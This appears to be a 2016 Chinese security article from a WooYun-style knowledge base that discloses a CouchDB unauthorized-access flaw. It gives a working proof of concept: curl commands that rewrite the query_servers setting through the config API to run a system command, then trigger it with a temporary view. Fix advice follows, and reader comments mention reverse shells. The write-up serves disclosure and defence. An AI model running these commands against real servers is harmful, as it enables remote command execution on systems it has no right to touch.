<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用CouchDB未授权访问漏洞执行任意系统命令</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">阿里云安全</a> <span class="bull">·</span> <time title="2016/05/19 9:06" ui-time="" datetime="2016/05/19 9:06" class="published ng-binding ng-isolate-scope">2016/05/19 9:06</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>5月16日阿里云盾攻防对抗团队从外部渠道获知CouchDB数据库存在未授权访问漏洞（在配置不正确的情况下）。经过测试，云盾团队率先发现利用该未授权访问漏洞不仅会造成数据的丢失和泄露，<code>甚至可执行任意系统命令</code>。云盾安全专家团队第一时间完成了漏洞上报、安全评级，并通知了所有可能受影响的用户。下面将对该漏洞的出处和技术细节做详细解释。</p><h1>0x01 漏洞的来龙去脉</h1><hr><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 <code>RESTful JavaScript Object Notation (JSON) API</code> 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。</p><p>那么，问题出在哪呢？翻阅官方描述会发现，CouchDB中有一个<code>Query_Server</code>的配置项，在官方文档中是这么描述的：</p><blockquote><p>CouchDB delegates computation of design documents functions to external query servers. The external query server is a special OS process which communicates with CouchDB over standard input/output using a very simple line-based protocol with JSON messages.</p></blockquote><p>直白点说，就是CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，<code>query_server</code>在配置文件local.ini中的格式：</p><pre><code>[query_servers]
LANGUAGE = PATH ARGS
</code></pre><p>默认情况下，配置文件中已经设置了两个query_servers:</p><pre><code>[query_servers]
javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js
</code></pre><p>可以看到，CouchDB在<code>query_server</code>中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就<strong>可以利用数据库来执行命令了</strong>，但是这个配置是在local.ini文件中的，如何控制呢？</p><p>继续读官方的文档，发现了一个有意思的功能，CouchDB提供了一个API接口用来更改自身的配置，并把修改后的结果保存到配置文件中：</p><blockquote><p>The CouchDB Server Configuration API provide an interface to query and update the various configuration values within a running CouchDB instance</p></blockquote><p><img alt="" img-src="05a927299b50f874e174d66084cd97cdb8fae3c1.jpg"></p><p>也就是说，除了<code>local.ini</code>的配置文件，CouchDB允许通过自身提供的<code>Restful API</code>接口动态修改配置属性。结合以上两点，<strong>我们可以通过一个未授权访问的CouchDB</strong>，通过修改其<code>query_server</code>配置，来执行系统命令。</p><h1>0x02 漏洞的POC</h1><hr><p>新增<code>query_server</code>配置，这里执行ifconfig命令</p><pre><code>#!shell
curl -X PUT 'http://1.1.1.1:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt;/tmp/6666"'
</code></pre><p>新建一个临时表，插入一条记录</p><pre><code>#!shell
curl -X PUT 'http://1.1.1.1:5984/vultest'
curl -X PUT 'http://1.1.1.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
</code></pre><p>调用<code>query_server</code>处理数据</p><pre><code>#!shell
curl -X POST 'http://1.1.1.1:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
</code></pre><p><img alt="" img-src="8834e9098dde132b0c0ee6625b96af6f3c8a383a.jpg"></p><p>执行后，可以看到，指定的命令已经成功执行：</p><p><img alt="" img-src="6595b3b6d031fd612fbb7934a90d7de69aa2d355.jpg"></p><p>至于如何回显执行结果，各位可以动动脑筋，欢迎互动。</p><h1>0x03 漏洞修复建议：</h1><hr><p>1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p><p>2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。</p><p>附：参考链接：</p><ul><li><a href="http://blog.rot13.org/2010/11/triggers-in-couchdb-from-queue-to-external-command-execution.html">http://blog.rot13.org/2010/11/triggers-in-couchdb-from-queue-to-external-command-execution.html</a></li><li><a href="http://docs.couchdb.org/en/1.6.1/api/server/configuration.html#api-config">http://docs.couchdb.org/en/1.6.1/api/server/configuration.html#api-config</a></li><li><a href="http://docs.couchdb.org/en/1.6.1/intro/api.html">http://docs.couchdb.org/en/1.6.1/intro/api.html</a></li><li><a href="http://docs.couchdb.org/en/1.6.1/config/query-servers.html">http://docs.couchdb.org/en/1.6.1/config/query-servers.html</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2016-05-20 21:30:03</span></div><p></p><p>how to avoid `kill -9 1759` in results ?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jjboom</span> <span class="reply-time">2016-05-20 00:25:42</span></div><p></p><p>@小饼仔 插入数据不会调用的。他的query_server作用是使用用户自定义的代码处理存储的数据，类似mysql的udf，需要先插入数据，再次查询这些数据的时候，触发payload</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-05-20 00:18:58</span></div><p></p><p>文中这句 “调用query_server处理数据”，然后执行了命令<br>之前插入数据不会触发，调用query_server吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">放开那个大婶</span> <span class="reply-time">2016-05-19 20:07:15</span></div><p></p><p>@cfan 那是因为你反弹ｓｈｅｌｌ的命令会一直执行，</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">伤心</span> <span class="reply-time">2016-05-19 19:03:07</span></div><p></p><p>菊爷666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sai、</span> <span class="reply-time">2016-05-19 17:33:07</span></div><p></p><p>Mark了，又一个未授权访问的洞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cfan</span> <span class="reply-time">2016-05-19 16:15:33</span></div><p></p><p>一般都设置密码了。<br>执行反弹命令，过几秒就断一下，不需要重新执行命令，他会自动连过来！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jjboom</span> <span class="reply-time">2016-05-19 16:00:59</span></div><p></p><p>@EvilAnne 提示这个说明couchdb已经设置了密码了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">EvilAnne</span> <span class="reply-time">2016-05-19 13:31:22</span></div><p></p><p>测试大部分都是这样呢 ～<br>&quot; {&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;server_admin access is required for this request&quot;} &quot;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cf_hb</span> <span class="reply-time">2016-05-19 12:46:55</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ghy459</span> <span class="reply-time">2016-05-19 09:33:45</span></div><p></p><p>1wb出文章作者果照</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">气质鸵鸟</span> <span class="reply-time">2016-05-19 09:30:32</span></div><p></p><p>菊菊菊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">憔悴</span> <span class="reply-time">2016-05-19 09:26:17</span></div><p></p><p>:）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">放开那个大婶</span> <span class="reply-time">2016-05-19 09:12:53</span></div><p></p><p>666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BIC</span> <span class="reply-time">2016-05-19 09:10:59</span></div><p></p><p>赞~\(≧▽≦)/~</p><p></p></div></div></div></div></div></main>